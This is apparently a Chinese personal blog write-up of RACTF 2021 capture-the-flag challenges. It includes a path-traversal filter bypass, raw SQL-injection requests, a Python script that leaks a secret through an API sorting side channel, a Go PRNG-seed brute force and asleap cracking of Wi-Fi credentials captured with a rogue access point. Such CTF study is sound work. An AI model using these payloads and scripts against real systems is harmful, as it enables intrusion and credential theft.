---
butterId: a13494bb-6130-4ccf-8ca4-202b501898a0 // blog image bucket id [Don't remove]
---

# Week10 Summary

## What have I done

- RACTF 2021 复现
- InCTF 整理复现中

## [WriteUp] How did I accomplish these things

### Web

#### Emojibook

> The flag is at `/flag.txt`

题目给出了完整的代码，且告诉了我们 flag 所在的位置。在 notes/views.py 下可以发现任意文件读取。

```python
def view_note(request: HttpRequest, pk: int) -> HttpResponse:
    note = get_object_or_404(Note, pk=pk)
    text = note.body
    for include in re.findall("({{.*?}})", text):
        print(include)
        file_name = os.path.join("emoji", re.sub("[{}]", "", include))
        with open(file_name, "rb") as file:
            text = text.replace(include, f"<img src=\"data:image/png;base64,{base64.b64encode(file.read()).decode('latin1')}\" width=\"25\" height=\"25\" />")

    return render(request, "note.html", {"note": note, "text": text})
```

此时可以发现填入在双花括号中的内容被匹配出来并使用了 os.path.join 拼接后赋值给了最终返回响应内容的文件名。那么此时即可使用绝对路径进行任意文件读取。但是要达成需要先绕过笔记保存时的如下过滤。

```python
    def save(self, commit=True):
        instance = super(NoteCreateForm, self).save(commit=False)
        instance.author = self.user
        instance.body = instance.body.replace("{{", "").replace("}}", "").replace("..", "")

        with open("emoji.json") as emoji_file:
            emojis = json.load(emoji_file)

            for emoji in re.findall("(:[a-z_]*?:)", instance.body):
                instance.body = instance.body.replace(emoji, "{{" + emojis[emoji.replace(":", "")] + ".png}}")

        if commit:
            instance.save()
            self._save_m2m()

        return instance
```

其将双花括号和两点依次进行空替换处理，构造出如下载荷来达成渲染 emoji 从而达成任意文件读取。

```plain text
{..{/flag.txt}..}
```

此时替换后即可正好达成 {{/flag.txt}}，从而在查看页面中渲染出如下包含 flag 的信息。

```plain text
data:image/png;base64,cmFjdGZ7ZGo0bmcwX2xmaX0K
```

将字符串中包含的 Base64 字符串解码即可得到 flag。

```flag
ractf{dj4ng0_lfi}
```

#### Really Awesome Hidden Service

Tor 打开所给的链接后可以得到如下页面。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257051164705/8bc89dcda1cc9f449fd31d4c35c7ea0e89fcb763.png)

因此需要想办法找到隐藏的服务，参照如下页面可以找到思路。

> https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/

由于站点使用的 favicon 都是一样的，因此可以使用 favicon 的 MurmurHash3 配合 Shodan 来进行页面搜寻。将页面所用的 favicon 下载下来后使用如下脚本得到 hash。

```python
import requests,mmh3,base64
favicon = base64.encodebytes(open("./favicon.ico", "rb").read())
hash = mmh3.hash(favicon)
print(hash)
```

使用 Shodan 配合关键词 http.favicon.hash:-915494641 搜索可以得到如下结果。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257334439457/21363494246d6938dfc690c67f4352e9ae3b4649.png)

可以发现得出了两个页面，访问页面即可得到 flag。

```flag
ractf{DreadingPirates}
```

#### Really Awesome Monitoring Dashboard

打开站点后查看请求，可以发现有一个 /api/ds/query 的请求中提交了 SQL 语句，且其所使用的数据库类型是 SQLite。按照其请求构造出如下载荷来尝试读取出表结构。

```json
{
    "queries":[
        {
            "queryText":"SELECT group_concat(sql) FROM sqlite_master;",
            "queryType":"table",
            "rawQueryText":"SELECT group_concat(sql) FROM sqlite_master;",
            "refId":"A",
            "datasource":"sqlite",
            "datasourceId":1,
            "intervalMs":30000,
            "maxDataPoints":710
        }
    ]
}
```

可以发现响应中确实包含了表的结构，处理之后得到如下表结构。

```sqlite
CREATE TABLE "logs" (
	"host"	TEXT NOT NULL,
	"status"	TEXT NOT NULL
),CREATE TABLE "flags" (
	"challenge"	INTEGER NOT NULL,
	"flag"	TEXT NOT NULL
)
```

因此进一步构造出如下载荷读取出 flag。

```json
{
    "queries":[
        {
            "queryText":"SELECT group_concat(flag) FROM flags;",
            "queryType":"table",
            "rawQueryText":"SELECT group_concat(flag) FROM flags;",
            "refId":"A",
            "datasource":"sqlite",
            "datasourceId":1,
            "intervalMs":30000,
            "maxDataPoints":710
        }
    ]
}
```

将包含载荷的请求发送即可在响应中得到 flag。

```flag
ractf{BringBackNagios}
```

#### Secret Store

> How many secrets could a secret store store if a store could store secrets?

题目给出的源码关键部分如下。

```python
class SecretViewSet(viewsets.ModelViewSet):
    queryset = Secret.objects.all()
    serializer_class = SecretSerializer
    permission_classes = (IsAuthenticated & IsSecretOwnerOrReadOnly,)
    filter_backends = [filters.OrderingFilter]
    ordering_fields = "__all__"
```

在登录后按照提示访问 /api/secret/ 路由可以提交一个 secret，在尝试之下可以发现 GET 请求这个路由可以得到目前所有存储的 secret 的基本信息。此时再来看这个 ViewSet，注意到他的 ordering_filelds 的值被设定为了 \_\_all\_\_。查阅 Django 的文档可以发现有如下描述。

> If you are confident that the queryset being used by the view doesn't contain any sensitive data, you can also explicitly specify that a view should allow ordering on *any* model field or queryset aggregate, by using the special value `'__all__'`.

因此我们可以指定任意的一个键值作为排序的依据，而当我们反复覆写的 value 达到跟 id 为 1 的 secret 的临界值的时候，就可以得出某一位的值。譬如在内容为 rb 的时候，排序应该位于所求 secret 的 ra 的下方，而 ra 的时候则可能有所变化。按照这个规则写出如下脚本来获取 flag。

```python
import httpx as requests
from bs4 import BeautifulSoup
import json
import string

session = requests.Client(base_url="http://193.57.159.27:49687/")

# Fetch CSRF token
response = session.get("/auth/login")
html = BeautifulSoup(response.text, "html.parser")
csrfToken = html.find_all("input")[0]["value"]
print(f"[+] found CSRF token {csrfToken}")

# Login
response = session.post("/auth/login/", data={
    "csrfmiddlewaretoken": csrfToken,
    "username": "atest",
    "password": "thisisapassword"
})
assert "Hi" in response.content.decode()
print("[+] login successfully!")

# Bruteforce flag
flag = ""
characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
while True:
    signal = False
    for x in range(len(characters)):
        response = session.post("/api/secret/", json={
            "value": flag + characters[x]
        },headers={
            "X-CSRFToken": session.cookies['csrftoken']
        })
        selfSecretId = json.loads(response.content.decode())["id"]

        response = session.get("/api/secret/", params={
            "ordering": "value"
        })
        data = json.loads(response.content.decode())
        for datum in data:
            if datum["id"] == selfSecretId:
                break
            if datum["id"] == 1:
                signal = True
                break
        if signal == True:
            flag += characters[x - 1]
            print(flag)
            break
```

运行脚本可以得出 flag。

```flag
ractf{data_exf1l_via_s0rt1ng_0c66de47}
```

#### Military Grade

> Go is safe, right? That means my implementation of AES will be secure?

题目给出的源码如下。

```go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

const rawFlag = "[REDACTED]"

var flag string
var flagmu sync.Mutex

func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte {
	padding := (blockSize - len(ciphertext)%blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string {
	bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext))
	block, err := aes.NewCipher(bKey)
	if err != nil {
		log.Println(err)
		return ""
	}
	ciphertext := make([]byte, len(bPlaintext))
	mode := cipher.NewCBCEncrypter(block, bIV)
	mode.CryptBlocks(ciphertext, bPlaintext)
	return hex.EncodeToString(ciphertext)
}

func changer() {
	ticker := time.NewTicker(time.Millisecond * 672).C
	for range ticker {
		rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}

		flagmu.Lock()
		flag = encrypt(rawFlag, key, iv, aes.BlockSize)
		flagmu.Unlock()
	}
}

func handler(w http.ResponseWriter, req *http.Request) {
	flagmu.Lock()
	fmt.Fprint(w, flag)
	flagmu.Unlock()
}

func main() {
	log.Println("Challenge starting up")
	http.HandleFunc("/", handler)

	go changer()

	log.Fatal(http.ListenAndServe(":80", nil))
}
```

可以发现是将 flag 使用 AES 加密后输出，访问靶机可以得到一个 flag 的密文。根据其算法可知，由于 0x7FFFFFFFFEFFF000 的处理使得此处可以爆破出 flag。写个脚本来完成爆破。

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strings"
)

func main() {
	aesFlag := "ff322d526ea821a59e7da84a1da772fe6cf99e7e5b02a1fd3ac7776b1cfdb03c"
	for seed := 1; seed <= 2147483647; seed++ {
		rand.Seed(int64(seed))
		for i := 0; i < rand.Intn(32); i++ {
			rand.Seed(rand.Int63())
		}

		var key []byte
		var iv []byte

		for i := 0; i < 32; i++ {
			key = append(key, byte(rand.Intn(255)))
		}

		for i := 0; i < aes.BlockSize; i++ {
			iv = append(iv, byte(rand.Intn(255)))
		}

		block, _ := aes.NewCipher(key)
		decodedFlag, _ := hex.DecodeString(aesFlag)
		mode := cipher.NewCBCDecrypter(block, iv)
		bFlag := make([]byte, len(decodedFlag))
		mode.CryptBlocks(bFlag, decodedFlag)
		flag := string(bFlag)
		if strings.Contains(flag, "ractf") {
			flag := flag[:len(flag) - 1]
			fmt.Printf(flag)
			break
		}
	}
}
```

运行脚本可得 flag。

```flag
ractf{int3rEst1ng_M4sk_paTt3rn}
```

### Miscellaneous

#### Missing Tools

> Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?

给出的是一个有诸多限制的 bash，使用 echo * 可以发现在当前的目录下有 flag.txt。作者忽略了 source 这个指令，因此导致了一个非预期，直接 source flag.txt 即可得到如下回显。

```plain text
source: ractf{std0ut_1s_0v3rr4ted_spl1t_sha}: No such file or directory
```

##### Intended Solution

这题的预期解是使用 split 配合 sha256sum 来将 flag 分割成一个字符一个文件然后得出 hash，再根据字母表做出一个 map，匹配之后得出 flag。执行 split -b 1 flag.txt 和 sha256sum x* 之后可以得到如下内容。

```plain text
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xaa
ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xab
2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6  xac
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xad
252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111  xae
021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96  xaf
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xag
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xah
18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xai
5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaj
0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6  xak
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xal
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xam
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xan
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xao
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xap
5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9  xaq
4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080  xar
4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce  xas
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xat
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xau
4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a  xav
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xaw
3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea  xax
18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4  xay
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xaz
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xba
148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940  xbb
acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0  xbc
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  xbd
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8  xbe
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde  xbf
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89  xbg
aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123  xbh
ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xbi
d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2  xbj
```

> https://md5decrypt.net/

使用在线的解密工具处理后可以得到如下包含 flag 的内容。

```plain text
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r
ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a
2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6 : c
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t
252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111 : f
021fb596db81e6d02bf3d2586ee3981fe519f275c0ac9ca76bbcf2ebb4097d96 : {
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t
18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d
5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0
0bfe935e70c321c7ca3afc75ce0d0ca2f98b5422e008bb31c00c6d7f1f1c0ad6 : u
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _
5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9 : 0
4c94485e0c21ae6c41ce1dfe7b6bfaceea5ab68e40a2476f50208e526f506080 : v
4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce : 3
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r
454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1 : r
4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a : 4
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t
3f79bb7b435b05321651daefd374cdc681dc06faa65e374e38337b88ca046dea : e
18ac3e7343f016890c510e93f935261169d9e3f565436429830faf0934f4f8e4 : d
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s
148de9c5a7a44d19e56cd9ae1a554bf67847afb0c58f6e12fa29ac7ddfca9940 : p
acac86c0e609ca906f632b0e2dacccb2b77d22b0621f20ebece1a4835b93f6f0 : l
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b : 1
e3b98a4da31a127d4bde6e43033f66ba274cab0eb7eb1c70ec41402bf6273dd8 : t
d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde : _
043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89 : s
aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123 : h
ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb : a
d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2 : }
```

```flag
ractf{std0ut_1s_0v3rr4ted_spl1t_sha}
```

#### Call&Response

> Agent,
>
> We're working a major case. We've been called in to covertly investigate a foreign govt agency, the GDGS, by a private organisation. We've finished performing initial reconnaissance of the target building and it's surrounding areas. We know they have a wireless network which they use to carry out live activities. Gaining access here would be substiantial. Problem is, they've somewhat competently secured it using WPA2 EAP-PEAP authentication which means gaining a packet capture of the handshake process is useless as the authentication exchange is carried out over a TLS 1.2 session. Nonetheless, we setup an access point with same ESSID as the target and managed to trick an employee's device into attempting to connect to our AP. In the process, we've obtained an username and certain auth values. We're not entirely sure what we need to do with them.
>
> Can you take a look and help us recover the password?
>
> ```
> username:    PrinceAli
> c:    c3:ae:5e:f9:dc:0e:22:fb
> r:    6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0
> ```
>
> Flag format is `ractf{recovered_password}`.

根据给出的信息可以找出如下参考文章。

> https://solstice.sh/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/#:~:text=This%20data%20can%20be%20passed%20to%20asleap%20to%20obtain%20a%20valid%20set%20of%20RADIUS%20credentials.

使用文章中给出的格式和题目信息构造出如下指令。

```bash
$asleap -C c3:ae:5e:f9:dc:0e:22:fb -R 6c:52:1e:52:72:cc:7a:cb:0e:99:5e:4e:1c:3f:ab:d0:bc:39:54:8e:b0:21:e4:d0 -W 10-million-password-list-top-10000.txt
```

运行指令可以得出如下信息。

```plain text
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using wordlist mode with "10-million-password-list-top-10000.txt".
        hash bytes:        8799
        NT hash:           1cb292fbd610e825d02492ec8d8c8799
        password:          rainbow6
```

因此可以得出 flag。

```flag
ractf{rainbow6}
```

#### RSFPWS - Intercepted

> This game i'm playing is fun! There's this box that seemingly does nothing though... It sends a "network request" whatever that is. Can you have a look?
>
> (When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)

按照题目信息进入游戏之后可以发现如下方块。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274049432813/159081701df3f928ef111172b64463edd0315e45.png)

使用 WireShark 来抓取流量，控制游戏角色走入方块中，即可在 WireShark 中看到一个 TCP 流量包，其中包含如下内容。

```plain text
"...........Welcome to the server!....................Lemon-...............Lemon.......@...................?........	...*.......	.......ractf{N3tw0rking_L1ke_4_B0ss!}
```

可以发现其中包含着 flag。

```flag
ractf{N3tw0rking_L1ke_4_B0ss!}
```

#### RSFPWS - Invulnerable

> This game i'm playing is fun! They have these cubes where you walk into them and take damage, how awesome! One of them instant kills you though, that kinda sucks. Can you solve that?
>
> (When the game launches, enter the IP and port you get from above. This challenge uses the same files and instance as other RSFPWS challenges)

进入游戏之后发现两个方块。一个是游戏角色 HP-5 而一个是直接将游戏角色 HP 变为 0。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275544775010/4b1da8b0c7d07e8aa89c393a2739e1897946ff0a.png)

只需要用 Cheat Engine 找出存储了 HP 变量的位置，再附加调试后在游戏中尝试一次将游戏角色的 HP 减为 0 的方块，找出向其中写入值的函数并 NOP 掉即可在游戏角色 HP 被变为 0 之后使得游戏不被重置而看到 flag。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629274765622333/5d0f9231957d53834c7154e710390cd5696aeb99.png)

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629275027310019/afc410f5a95c43ae1bcc222f2b798f8ad63a0e6c.png)

```flag
ractf{Y0uB3tt3rN0tHav3De0bfusc4ted...}
```

### Steganography

#### The Glory Days

> My friend sent me this audio file, I'm sure I recognise it but I think he's tweaked it to hide a message somewhere. Can you take a look?

附件是一个 Midi 文件，使用 Midi Editor 打开文件可在 Track 0 的位置发现摩斯电码。

![](https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629278284838741/6ec953331d6f392b0ae7ba1137c5d7688d1555f4.png)

将其抄写下来可以得到如下内容。

```plain text
--- .--- --.- .-- --. ..... -.. --. .--. -. --. -..- -.- ....- --.. .-. -- -. .--. ..- ..--- -- -.. ... -.- -. ... ...- -.... - .-.. ..-. --- -. .--- - .. --.. --.. - .--. ..- 
```

使用如下的 CyberChef Receipt 处理之后可得 flag。

```plain text
From_Morse_Code('Space','Line feed')
From_Base32('A-Z2-7=',true)
```

```flag
ractf{Mus1c_M0rSe_MesS4g3}
```

## Summary

InCTF 做到后面的时候电脑出问题了 QAQ，只能等环境开源了。RACTF 真好玩。
